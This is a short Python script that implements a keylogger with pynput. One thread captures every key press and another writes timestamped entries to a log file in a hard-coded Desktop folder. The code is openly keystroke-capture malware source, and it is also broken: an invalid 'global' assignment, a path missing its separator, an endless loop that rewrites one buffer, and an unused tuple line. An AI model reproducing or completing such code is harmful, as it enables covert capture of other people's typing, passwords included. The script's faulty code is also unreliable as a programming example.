import threading
import datetime
from pynput.keyboard import Key, Listener

log_dir = "/home/kostas/Desktop"

buffer = ""


def on_press(key):
    global buffer = "{0} pressed" .format(key)
    print("{0} pressed" .format(key))


def on_release(key):
    if key == Key.esc:
        return False


def keylogger_function():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


def filewritter_function():
    file = open((log_dir + "log_file.txt"), "w")

    while True:
        now = datetime.datetime.now()

        now.year, now.month, now.day, now.hour, now.minute, now.second
        file.write(str(now.year) + "-" + str(now.month) + "-" + str(now.day) + "-" + str(now.hour) + "-" + str(now.minute) + "-" + str(now.second) + ":" + buffer + "\n")
        file.flush()

def main():

    keylogger_thread = threading.Thread(target=keylogger_function)
    filewritter_thread = threading.Thread(target=filewritter_function)

    keylogger_thread.start()
    filewritter_thread.start()


if __name__ == "__main__":
    main()